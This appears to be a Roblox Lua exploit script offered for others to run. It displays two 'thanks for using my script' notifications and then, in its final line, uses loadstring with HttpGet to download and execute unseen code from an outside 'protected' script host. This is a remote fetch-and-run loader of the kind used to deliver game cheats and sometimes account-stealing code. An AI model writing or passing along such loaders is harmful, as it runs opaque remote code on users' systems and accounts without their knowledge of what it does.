-- Get the StarterGui service
local StarterGui = game:GetService("StarterGui")

-- Send first notification
StarterGui:SetCore("SendNotification", {
    Title = "Hello",
    Text = "Thanks for using my script!",
    Duration = 5 -- Duration in seconds
})

-- Send second notification
StarterGui:SetCore("SendNotification", {
    Title = "Notify",
    Text = "If you showcase this on YouTube, thank you! I'll try to update 1.5",
    Duration = 10 -- Duration in seconds
})

-- Execute external script
loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/367dd357c8fbb67d557895a5f6391228"))()
